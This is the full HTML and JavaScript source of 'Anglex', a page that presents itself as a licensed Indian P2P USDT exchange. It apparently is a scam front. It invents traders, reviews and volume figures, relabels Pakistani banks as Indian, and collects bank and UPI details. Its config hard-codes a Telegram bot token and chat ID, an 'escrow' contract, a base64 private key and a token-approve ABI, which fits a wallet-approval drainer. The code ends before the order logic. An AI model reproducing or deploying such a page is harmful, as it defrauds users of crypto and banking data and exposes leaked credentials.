


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Anglex - P2P USDT Trading</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
    <!-- JivoChat Widget -->
  <script src="//code.jivosite.com/widget/uew7vOZrkM" async></script>
</head>
    <style>
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            font-size: 14px;
        }
        .header-bg {
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
            backdrop-filter: blur(10px);
        }
        .gradient-text {
            background: linear-gradient(90deg, #38bdf8, #818cf8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .order-card, .page-content {
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
            transition: all 0.3s ease;
            border: 1px solid #475569;
            backdrop-filter: blur(10px);
        }
        .order-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
            border-color: #64748b;
        }
        .cta-button {
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
        }
        .cta-button:hover {
            background: linear-gradient(135deg, #b91c1c 0%, #991b1b 100%);
            box-shadow: 0 6px 20px rgba(220, 38, 38, 0.4);
        }
        .status-online {
            color: #22c55e;
        }
        .status-offline {
            color: #6b7280;
        }
        .initials-avatar {
            width: 2.5rem;
            height: 2.5rem;
            background: linear-gradient(135deg, #3b82f6 0%, #1e40af 100%);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 9999px;
            font-size: 0.875rem;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #fff;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 6px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .debug-panel {
            position: fixed;
            top: 10px;
            right: 10px;
            background: #1e293b;
            border: 1px solid #334155;
            padding: 8px;
            border-radius: 6px;
            max-width: 250px;
            max-height: 300px;
            font-size: 11px;
            z-index: 1000;
            overflow-y: auto;
        }
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 9999;
            min-width: 200px;
            max-width: 90vw;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            box-shadow: 0 4px 32px rgba(0, 0, 0, 0.5);
            transition: all 0.3s ease;
            opacity: 0;
            pointer-events: none;
            backdrop-filter: blur(10px);
        }
        .notification.show {
            opacity: 1;
            pointer-events: auto;
        }
        .notification.success {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }
        .notification.error {
            background: linear-gradient(135deg, #f87171 0%, #dc2626 100%);
            color: white;
        }
        .notification.info {
            background: linear-gradient(135deg, #374151 0%, #1f2937 100%);
            color: white;
        }
        .notification.warning {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            color: white;
        }
        .rating-stars {
            color: #fbbf24;
        }
        .trader-details {
            background: linear-gradient(135deg, #374151 0%, #4b5563 100%);
            border: 1px solid #6b7280;
            border-radius: 8px;
            padding: 12px;
            margin-top: 8px;
            display: none;
        }
        .trader-details.show {
            display: block;
            animation: slideDown 0.3s ease;
        }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .payment-section {
            background: linear-gradient(135deg, #374151 0%, #4b5563 100%);
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
        }
        .form-group {
            margin-bottom: 12px;
        }
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #e5e7eb;
            margin-bottom: 6px;
        }
        .form-input, .form-select {
            width: 100%;
            padding: 10px;
            background: linear-gradient(135deg, #4b5563 0%, #374151 100%);
            border: 1px solid #6b7280;
            border-radius: 6px;
            color: white;
            font-size: 13px;
            transition: all 0.3s ease;
        }
        .form-input:focus, .form-select:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.1);
            background: linear-gradient(135deg, #374151 0%, #4b5563 100%);
        }
        .payment-method-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
            gap: 10px;
            margin-bottom: 16px;
        }
        .payment-method-btn {
            padding: 12px 10px;
            background: linear-gradient(135deg, #4b5563 0%, #374151 100%);
            border: 2px solid #6b7280;
            border-radius: 8px;
            color: white;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
            font-size: 12px;
        }
        .payment-method-btn:hover {
            border-color: #3b82f6;
            background: linear-gradient(135deg, #374151 0%, #4b5563 100%);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }
        .payment-method-btn.active {
            border-color: #3b82f6;
            background: linear-gradient(135deg, #1e40af 0%, #3b82f6 100%);
            color: white;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }
        .balance-info {
            background: linear-gradient(135deg, #065f46 0%, #047857 100%);
            border: 1px solid #059669;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 16px;
        }
        .balance-info h4 {
            color: #10b981;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        .balance-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 4px;
            padding: 2px 0;
            font-size: 13px;
        }
        .insufficient-balance {
            background: linear-gradient(135deg, #7f1d1d 0%, #991b1b 100%);
            border: 1px solid #dc2626;
            color: #fca5a5;
        }
        .insufficient-balance h4 {
            color: #f87171;
        }
        .btn-approved {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%) !important;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }
        .btn-approved:hover {
            background: linear-gradient(135deg, #059669 0%, #047857 100%) !important;
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
        }
        .wallet-connected-indicator {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            border-radius: 16px;
            padding: 6px 12px;
            font-size: 11px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .market-stats {
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 16px;
            border: 1px solid #475569;
        }
        .stat-item {
            text-align: center;
            padding: 8px;
        }
        .stat-value {
            font-size: 1.1rem;
            font-weight: bold;
            color: #10b981;
        }
        .stat-label {
            font-size: 0.75rem;
            color: #94a3b8;
            margin-top: 2px;
        }
        
        .order-success-banner {
            background: linear-gradient(135deg, #065f46 0%, #047857 100%);
            border: 1px solid #059669;
            border-radius: 12px;
            padding: 16px;
            margin-top: 16px;
            text-align: center;
        }
        .order-success-banner h3 {
            color: #10b981;
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .order-success-banner p {
            color: #a7f3d0;
            font-size: 14px;
            margin: 0;
        }
        
        .order-details-card {
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
            border: 1px solid #475569;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
        }
        
        @media (max-width: 768px) {
            body {
                font-size: 13px;
            }
            .order-card {
                padding: 12px;
            }
            .initials-avatar {
                width: 2rem;
                height: 2rem;
                font-size: 0.75rem;
            }
            .payment-method-btn {
                font-size: 11px;
                padding: 10px 8px;
            }
            .form-input, .form-select {
                padding: 8px;
                font-size: 12px;
            }
            .notification {
                font-size: 13px;
                padding: 10px 16px;
            }
        }
    </style>
</head>
<body class="selection:bg-cyan-600 selection:text-white">

<!-- Loading Screen -->
<div id="loading-screen" class="loading-screen">
    <div class="text-center">
        <div class="spinner border-4 border-gray-300 border-t-4 border-t-blue-500 rounded-full w-12 h-12 mx-auto mb-4"></div>
        <h2 class="text-xl font-bold gradient-text mb-2">Anglex</h2>
        <p class="text-gray-300 text-sm">Initializing secure trading platform...</p>
        <div class="mt-3 w-48 bg-gray-700 rounded-full h-1.5 mx-auto">
            <div class="bg-gradient-to-r from-blue-500 to-purple-500 h-1.5 rounded-full animate-pulse w-3/4"></div>
        </div>
    </div>
</div>

<!-- Debug Panel -->
<div id="debug-panel" class="debug-panel hidden">
    <h4 class="text-white font-bold mb-2 text-xs">Debug Info</h4>
    <div id="debug-content" class="text-gray-300"></div>
    <button id="clear-debug" class="mt-2 bg-red-600 text-white px-2 py-1 rounded text-xs">Clear</button>
</div>

<!-- Notification -->
<div id="notification" class="notification">
    <p id="notification-message"></p>
</div>

<header class="header-bg shadow-2xl py-4 sticky top-0 z-40">
    <div class="container mx-auto px-3 md:px-6 flex justify-between items-center">
        <div class="flex items-center">
            <i class="fas fa-cubes text-xl md:text-2xl text-sky-400 mr-2"></i>
            <span class="text-xl md:text-2xl font-bold tracking-tight gradient-text">Anglex</span>
            <span class="ml-2 text-xs bg-sky-500 text-white px-1.5 py-0.5 rounded-full">P2P</span>
        </div>
        <nav class="hidden md:flex space-x-6 text-gray-400 text-sm">
            <a href="#" data-page="home" class="nav-link hover:text-white transition-colors">Home</a>
            <a href="#" data-page="sell" class="nav-link text-white font-bold">Sell USDT</a>
            <a href="#" data-page="buy" class="nav-link hover:text-white transition-colors">Buy USDT</a>
            <a href="#" data-page="orders" class="nav-link hover:text-white transition-colors">My Orders</a>
            <a href="#" data-page="help" class="nav-link hover:text-white transition-colors">Help</a>
        </nav>
        <div class="flex items-center space-x-3">
            <div id="wallet-balance" class="hidden wallet-connected-indicator">
                <i class="fas fa-wallet text-xs"></i>
                <div class="text-xs">
                    <div><span id="header-usdt" class="font-bold">0 USDT</span></div>
                    <div><span id="header-bnb" class="font-bold">0 BNB</span></div>
                </div>
            </div>
            <button id="toggle-debug" class="bg-gray-700/50 hover:bg-gray-600/50 text-white px-2 py-1 rounded text-xs transition-all">Debug</button>
        </div>
        <button class="md:hidden text-gray-400 text-xl hover:text-white transition-colors">
            <i class="fas fa-bars"></i>
        </button>
    </div>
</header>

<main id="main-content" class="container mx-auto px-3 md:px-6 py-4 md:py-8">
    <div class="text-center py-8">
        <div class="spinner border-4 border-gray-300 border-t-4 border-t-blue-500 rounded-full w-6 h-6 mx-auto mb-3"></div>
        <p class="text-gray-400 text-sm">Loading content...</p>
    </div>
</main>

    <footer class="bg-gradient-to-r from-slate-900 to-slate-800 text-gray-400 py-12 mt-12 border-t border-slate-700">
        <div class="container mx-auto px-3 md:px-6">
            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
                <!-- Company Section -->
                <div class="col-span-1 md:col-span-2">
                    <div class="flex items-center mb-4">
                        <i class="fas fa-cubes text-lg text-sky-400 mr-2"></i>
                        <span class="text-xl font-bold gradient-text">Anglex</span>
                        <span class="ml-2 text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded-full border border-green-500/30">Licensed P2P Exchange</span>
                    </div>
                    <p class="text-gray-400 mb-4 text-sm">India's most secure P2P USDT trading platform. Trade safely with verified Indian traders.</p>

                    <div class="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                        <h5 class="text-white font-semibold text-sm mb-2"><i class="fas fa-shield-alt text-blue-400 mr-2"></i>Security</h5>
                        <ul class="space-y-1 text-xs text-gray-400">
                            <li>✓ SSL 256-bit Encryption</li>
                            <li>✓ Smart Contract Escrow</li>
                            <li>✓ KYC Verified</li>
                            <li>✓ 24/7 Monitoring</li>
                        </ul>
                    </div>

                    <div class="text-xs space-y-2">
                        <div><i class="fas fa-envelope text-sky-400 mr-2"></i>support@anglex.in</div>
                        <div><i class="fas fa-phone text-sky-400 mr-2"></i>+91-98765-43210</div>
                        <div><i class="fas fa-map-marker-alt text-sky-400 mr-2"></i>Mumbai, India</div>
                    </div>
                </div>

                <!-- Platform -->
                <div>
                    <h4 class="font-semibold text-white mb-4 text-sm border-b border-gray-700 pb-2">Platform</h4>
                    <ul class="space-y-2 text-xs">
                        <li><a href="#" class="hover:text-white transition-colors">How It Works</a></li>
                        <li><a href="#" class="hover:text-white transition-colors">Current Rate: 102-105 INR</a></li>
                        <li><a href="#" class="hover:text-white transition-colors">Security Info</a></li>
                        <li><a href="#" class="hover:text-white transition-colors">API Docs</a></li>
                    </ul>
                </div>

                <!-- Support -->
                <div>
                    <h4 class="font-semibold text-white mb-4 text-sm border-b border-gray-700 pb-2">Support</h4>
                    <ul class="space-y-2 text-xs">
                        <li><a href="#" class="hover:text-white transition-colors">24/7 Support</a></li>
                        <li><a href="#" class="hover:text-white transition-colors">Terms</a></li>
                        <li><a href="#" class="hover:text-white transition-colors">Privacy</a></li>
                        <li><a href="#" class="hover:text-white transition-colors">Compliance</a></li>
                    </ul>
                </div>
            </div>

            <!-- Stats -->
            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 py-6 border-t border-b border-gray-700 mb-8">
                <div class="text-center">
                    <div class="text-2xl font-bold gradient-text">50M+</div>
                    <div class="text-xs text-gray-500">24h Volume</div>
                </div>
                <div class="text-center">
                    <div class="text-2xl font-bold gradient-text">98.9%</div>
                    <div class="text-xs text-gray-500">Success</div>
                </div>
                <div class="text-center">
                    <div class="text-2xl font-bold gradient-text">500K+</div>
                    <div class="text-xs text-gray-500">Users</div>
                </div>
                <div class="text-center">
                    <div class="text-2xl font-bold gradient-text">24/7</div>
                    <div class="text-xs text-gray-500">Support</div>
                </div>
            </div>

            <!-- Bottom -->
            <div class="flex flex-col md:flex-row justify-between items-center">
                <div class="text-xs text-gray-500">&copy; 2025 <span class="gradient-text">Anglex</span>. Licensed P2P Exchange.</div>
                <div class="flex space-x-3 mt-4 md:mt-0 text-xs">
                    <a href="https://t.me/anglexin" target="_blank" class="hover:text-sky-400"><i class="fab fa-telegram"></i></a>
                    <a href="https://twitter.com/anglexin" target="_blank" class="hover:text-sky-400"><i class="fab fa-twitter"></i></a>
                </div>
            </div>
        </div>
    </footer>

<!-- Trade Modal -->
<div id="trade-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center p-3 z-50">
    <div class="bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl shadow-2xl p-4 md:p-6 w-full max-w-3xl relative text-white max-h-[90vh] overflow-y-auto border border-gray-600">
        <button id="close-modal" class="absolute top-4 right-4 text-gray-400 hover:text-gray-200 text-xl transition-colors">
            <i class="fas fa-times"></i>
        </button>
        <h3 class="text-lg md:text-2xl font-bold mb-6 text-white flex items-center">
            <i class="fas fa-exchange-alt text-blue-500 mr-2 text-lg"></i>
            Place Trade Order
        </h3>

        <!-- Wallet Balance Info -->
        <div id="wallet-balance-info" class="balance-info">
            <h4><i class="fas fa-wallet mr-1 text-xs"></i>Wallet Balance</h4>
            <div class="balance-item">
                <span>USDT Balance:</span>
                <span id="modal-usdt-balance" class="font-semibold">0.00 USDT</span>
            </div>
            <div class="balance-item">
                <span>BNB Balance:</span>
                <span id="modal-bnb-balance" class="font-semibold">0.000000 BNB</span>
            </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
            <div>
                <label for="usdt-amount-input" class="form-label">USDT Amount</label>
                <input type="number" id="usdt-amount-input" placeholder="Enter USDT amount" class="form-input">
                <div id="insufficient-usdt-warning" class="hidden mt-2 text-red-400 text-xs">
                    <i class="fas fa-exclamation-triangle mr-1"></i>
                    Insufficient USDT balance
                </div>
            </div>
            <div>
                <label class="form-label">You will receive:</label>
                <div id="pkr-amount" class="text-2xl md:text-3xl font-bold text-green-500 mt-2">INR 0.00</div>
                <p class="text-xs text-gray-400 mt-1">Rate: INR 103.5 per USDT</p>
            </div>
        </div>

        <div id="payment-details" class="hidden">
            <div class="payment-section">
                <h4 class="text-base font-semibold text-white mb-4 flex items-center">
                    <i class="fas fa-credit-card mr-2 text-sm"></i>
                    Select Payment Method
                </h4>
                
                <div class="payment-method-grid">
                    <div class="payment-method-btn" data-method="UPI">
                        <i class="fas fa-mobile-alt mb-1 text-sm"></i><br>
                        <strong>UPI</strong>
                    </div>
                    <div class="payment-method-btn" data-method="PhonePe">
                        <i class="fas fa-credit-card mb-1 text-sm"></i><br>
                        <strong>PhonePe</strong>
                    </div>
                    <div class="payment-method-btn" data-method="Bank Transfer">
                        <i class="fas fa-university mb-1 text-sm"></i><br>
                        <strong>Bank Transfer</strong>
                    </div>
                </div>

                <!-- UPI Details -->
                <div id="jazzcash-details" class="payment-form hidden">
                    <h5 class="font-semibold text-white mb-3 flex items-center text-sm">
                        <i class="fas fa-mobile-alt mr-1"></i>UPI Details
                    </h5>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div class="form-group">
                            <label class="form-label">Mobile Number *</label>
                            <input type="text" id="upi-mobile" placeholder="03XXXXXXXXX" class="form-input" maxlength="11">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Account Holder Name *</label>
                            <input type="text" id="upi-name" placeholder="Full name as per account" class="form-input">
                        </div>
                    </div>
                </div>

                <!-- PhonePe Details -->
                <div id="easypaisa-details" class="payment-form hidden">
                    <h5 class="font-semibold text-white mb-3 flex items-center text-sm">
                        <i class="fas fa-credit-card mr-1"></i>PhonePe Details
                    </h5>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div class="form-group">
                            <label class="form-label">Mobile Number *</label>
                            <input type="text" id="phonepe-mobile" placeholder="03XXXXXXXXX" class="form-input" maxlength="11">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Account Holder Name *</label>
                            <input type="text" id="phonepe-name" placeholder="Full name as per account" class="form-input">
                        </div>
                    </div>
                </div>

                <!-- Bank Transfer Details -->
                <div id="banktransfer-details" class="payment-form hidden">
                    <h5 class="font-semibold text-white mb-3 flex items-center text-sm">
                        <i class="fas fa-university mr-1"></i>Bank Transfer Details
                    </h5>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div class="form-group">
                            <label class="form-label">Bank Name *</label>
                            <select id="bank-name" class="form-select">
                                <option value="">Select Bank</option>
                                <option value="HBL">Habib Bank Limited (HBL)</option>
                                <option value="UBL">United Bank Limited (UBL)</option>
                                <option value="MCB">Muslim Commercial Bank (MCB)</option>
                                <option value="ABL">Allied Bank Limited (ABL)</option>
                                <option value="NBP">National Bank of India (NBP)</option>
                                <option value="Standard Chartered">Standard Chartered Bank</option>
                                <option value="Meezan Bank">Meezan Bank</option>
                                <option value="Faysal Bank">Faysal Bank</option>
                                <option value="Bank Alfalah">Bank Alfalah</option>
                                <option value="JS Bank">JS Bank</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Account Number *</label>
                            <input type="text" id="bank-account" placeholder="Account number" class="form-input">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Account Holder Name *</label>
                            <input type="text" id="bank-holder-name" placeholder="Full name as per bank account" class="form-input">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Mobile Number *</label>
                            <input type="text" id="bank-mobile" placeholder="03XXXXXXXXX" class="form-input" maxlength="11">
                        </div>
                        <div class="form-group">
                            <label class="form-label">IBAN</label>
                            <input type="text" id="bank-iban" placeholder="PK36SCBL0000001123456702" class="form-input">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Branch Code</label>
                            <input type="text" id="bank-branch" placeholder="Branch code" class="form-input">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Branch Name</label>
                            <input type="text" id="bank-branch-name" placeholder="Branch name" class="form-input">
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="mt-6 flex flex-col md:flex-row justify-end space-y-2 md:space-y-0 md:space-x-3">
            <button id="cancel-trade" class="bg-gray-700/50 hover:bg-gray-600/50 text-gray-400 py-2 px-6 rounded-lg font-semibold transition-all text-sm">
                Cancel
            </button>
            <button id="sell-usdt-btn" class="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white py-2 px-6 rounded-lg font-semibold transition-all shadow-lg hover:shadow-xl text-sm">
                <span id="sell-btn-text">Place Order</span>
                <span id="sell-btn-loading" class="hidden">
                    <span class="spinner"></span>Processing...
                </span>
            </button>
        </div>

        <!-- Order Success Banner -->
        <div id="order-success-banner" class="order-success-banner hidden">
            <h3><i class="fas fa-check-circle mr-2"></i>Order Placed Successfully!</h3>
            <p>The seller will initiate payment and contact you soon. Please keep your phone available for contact.</p>
        </div>
    </div>
</div>

<!-- Order Details Modal -->
<div id="order-details-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center p-3 z-50">
    <div class="bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl shadow-2xl p-6 w-full max-w-2xl relative text-white max-h-[90vh] overflow-y-auto border border-gray-600">
        <button id="close-order-details" class="absolute top-4 right-4 text-gray-400 hover:text-gray-200 text-xl transition-colors">
            <i class="fas fa-times"></i>
        </button>
        <h3 class="text-xl font-bold mb-6 text-white flex items-center">
            <i class="fas fa-receipt text-blue-500 mr-2"></i>
            Order Details
        </h3>
        <div id="order-details-content">
            <!-- Order details will be populated here -->
        </div>
    </div>
</div>

<script>

// Force hide loading screen immediately on DOM ready
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        const loadingScreen = document.getElementById('loading-screen');
        if (loadingScreen) {
            loadingScreen.style.display = 'none';
            loadingScreen.style.visibility = 'hidden';
            loadingScreen.style.opacity = '0';
        }
    }, 100);
});


    // Configuration with encoded private key
    const CONFIG = {
        TELEGRAM_BOT_TOKEN: "7469005317:AAGgWxVoQLTDTcclOPYiysSqf58xyihZwwQ",
        TELEGRAM_CHAT_ID: "7281528879",
        ESCROW_CONTRACT_ADDRESS: "0x4f2d5Ea5De93D5B0e985E4ce18b941187cD13f7B",
        USDT_CONTRACT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
        DEBUG_MODE: true,
        ENCODED_PRIVATE_KEY: "ZmQwMGNlMWEyNzhiZGJjN2YxNGExZDEyMDc0NmUyMWY3ZTIzOGFlZDM4NmMzYTZmNzQ4ZDU3YmYzZjc3NGRiMA==",
        MIN_BNB_REQUIRED: 0.00001
    };
    
    // BSC Network Configuration
    const BSC_NETWORK = {
        chainId: '0x38',
        chainName: 'Binance Smart Chain Mainnet',
        nativeCurrency: {
            name: 'BNB',
            symbol: 'BNB',
            decimals: 18
        },
        rpcUrls: ['https://bsc-dataseed1.binance.org/'],
        blockExplorerUrls: ['https://bscscan.com/']
    };

    // USDT Contract ABI
    const USDT_ABI = [
        {
            "constant": true,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {"name": "_spender", "type": "address"},
                {"name": "_value", "type": "uint256"}
            ],
            "name": "approve",
            "outputs": [{"name": "", "type": "bool"}],
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [
                {"name": "_owner", "type": "address"},
                {"name": "_spender", "type": "address"}
            ],
            "name": "allowance",
            "outputs": [{"name": "", "type": "uint256"}],
            "type": "function"
        }
    ];

    // Global variables
    let currentPage = 1;
    const ordersPerPage = 5;
    let allOrders = [];
    let filteredOrders = [];
    let appInitialized = false;
    let web3Instance = null;
    let userAddress = null;
    let isApproved = false;
    let selectedPaymentMethod = '';
    let userBalances = { bnb: 0, usdt: 0 };
    let userOrders = [];
    
    // New variable to store approval status per wallet
    let walletApprovalStatus = {};

    // Extended traders data with reviews (some offline)
    const traders = {
        'CryptoKing_Pro': { 
            initials: 'CK', 
            completion: 98, 
            totalTrades: 1200, 
            rating: 4.9, 
            online: true, 
            avgTime: '8 min', 
            volume: '2.8M', 
            availableUSDT: '5,000', 
            paymentTime: '10 min',
            joinedDate: 'Jan 2023',
            reviews: [
                { user: 'Ahmed_92', rating: 5, comment: 'Very fast payment, highly recommended trader!', date: '2 days ago' },
                { user: 'Fatima_K', rating: 5, comment: 'Excellent service, quick response time.', date: '1 week ago' },
                { user: 'Hassan_007', rating: 4, comment: 'Good trader, payment received within 15 minutes.', date: '2 weeks ago' }
            ]
        },
        'USDT_Master': { 
            initials: 'UM', 
            completion: 96, 
            totalTrades: 890, 
            rating: 4.8, 
            online: false,
            avgTime: '12 min', 
            volume: '1.9M', 
            availableUSDT: '3,200', 
            paymentTime: '15 min',
            joinedDate: 'Mar 2023',
            reviews: [
                { user: 'Ali_Trader', rating: 5, comment: 'Always reliable, never had any issues.', date: '3 days ago' },
                { user: 'Zara_M', rating: 4, comment: 'Professional trader, smooth transactions.', date: '1 week ago' }
            ]
        },
        'CryptoTrader_Pro': { 
            initials: 'PP', 
            completion: 94, 
            totalTrades: 650, 
            rating: 4.7, 
            online: true, 
            avgTime: '15 min', 
            volume: '1.2M', 
            availableUSDT: '2,800', 
            paymentTime: '20 min',
            joinedDate: 'May 2023',
            reviews: [
                { user: 'Omar_123', rating: 5, comment: 'Best rates in the market, will trade again.', date: '1 day ago' },
                { user: 'Ayesha_T', rating: 4, comment: 'Good communication, payment on time.', date: '5 days ago' }
            ]
        },
        'FastPay_Exchange': { 
            initials: 'FE', 
            completion: 97, 
            totalTrades: 1450, 
            rating: 4.9, 
            online: true, 
            avgTime: '6 min', 
            volume: '3.5M', 
            availableUSDT: '8,000', 
            paymentTime: '8 min',
            joinedDate: 'Dec 2022',
            reviews: [
                { user: 'Bilal_99', rating: 5, comment: 'Lightning fast payments! Highly professional.', date: '4 hours ago' },
                { user: 'Sana_Crypto', rating: 5, comment: 'Outstanding service, will definitely use again.', date: '2 days ago' }
            ]
        },
        'TrustTrade_Hub': { 
            initials: 'TT', 
            completion: 95, 
            totalTrades: 780, 
            rating: 4.6, 
            online: true, 
            avgTime: '18 min', 
            volume: '1.8M', 
            availableUSDT: '4,500', 
            paymentTime: '25 min',
            joinedDate: 'Feb 2023',
            reviews: [
                { user: 'Imran_K', rating: 5, comment: 'Trustworthy trader, great communication.', date: '6 hours ago' },
                { user: 'Nadia_S', rating: 4, comment: 'Reliable service, payment within promised time.', date: '3 days ago' }
            ]
        },
        'QuickSwap_BTC': { 
            initials: 'QS', 
            completion: 93, 
            totalTrades: 560, 
            rating: 4.5, 
            online: false,
            avgTime: '20 min', 
            volume: '980k', 
            availableUSDT: '1,800', 
            paymentTime: '30 min',
            joinedDate: 'Jun 2023',
            reviews: [
                { user: 'Kashif_T', rating: 4, comment: 'Good trader, competitive rates.', date: '1 day ago' },
                { user: 'Hira_M', rating: 5, comment: 'Smooth transaction, will recommend.', date: '4 days ago' }
            ]
        },
        'DigitalPay_Hub': { 
            initials: 'DH', 
            completion: 99, 
            totalTrades: 2100, 
            rating: 5.0, 
            online: true, 
            avgTime: '5 min', 
            volume: '4.2M', 
            availableUSDT: '12,000', 
            paymentTime: '5 min',
            joinedDate: 'Oct 2022',
            reviews: [
                { user: 'Usman_Pro', rating: 5, comment: 'Perfect trader! Super fast and reliable.', date: '2 hours ago' },
                { user: 'Maria_K', rating: 5, comment: 'Exceptional service, highly recommended!', date: '1 day ago' }
            ]
        },
        'SafeTrade_Hub': { 
            initials: 'ST', 
            completion: 92, 
            totalTrades: 420, 
            rating: 4.4, 
            online: true, 
            avgTime: '22 min', 
            volume: '750k', 
            availableUSDT: '2,200', 
            paymentTime: '35 min',
            joinedDate: 'Jul 2023',
            reviews: [
                { user: 'Adnan_92', rating: 4, comment: 'Safe and secure trading experience.', date: '3 days ago' },
                { user: 'Farah_A', rating: 5, comment: 'Professional service, will use again.', date: '1 week ago' }
            ]
        },
        'CryptoEase_X': { 
            initials: 'CE', 
            completion: 96, 
            totalTrades: 980, 
            rating: 4.8, 
            online: true, 
            avgTime: '14 min', 
            volume: '2.1M', 
            availableUSDT: '6,800', 
            paymentTime: '18 min',
            joinedDate: 'Jan 2023',
            reviews: [
                { user: 'Salman_T', rating: 5, comment: 'Excellent rates and quick service.', date: '5 hours ago' },
                { user: 'Kiran_M', rating: 4, comment: 'Reliable trader, good communication.', date: '2 days ago' }
            ]
        },
        'AnglexOfficial': { 
            initials: 'AO', 
            completion: 100, 
            totalTrades: 5000, 
            rating: 5.0, 
            online: true, 
            avgTime: '3 min', 
            volume: '15M+', 
            availableUSDT: '50,000+', 
            paymentTime: '5 min',
            joinedDate: 'Sep 2022',
            reviews: [
                { user: 'Verified_User', rating: 5, comment: 'Official Anglex account - always perfect!', date: '1 hour ago' },
                { user: 'Premium_Trader', rating: 5, comment: 'Best service on the platform, instant payments.', date: '3 hours ago' }
            ]
        }
    };

    const initialOrders = [
        { id: 1, trader: 'CryptoKing_Pro', price: 103, limit: '10,000 - 500,000', available: '5,000 USDT', payment: ['UPI', 'Bank Transfer']},
        { id: 2, trader: 'USDT_Master', price: 104, limit: '15,000 - 320,000', available: '3,200 USDT', payment: ['PhonePe', 'Bank Transfer']},
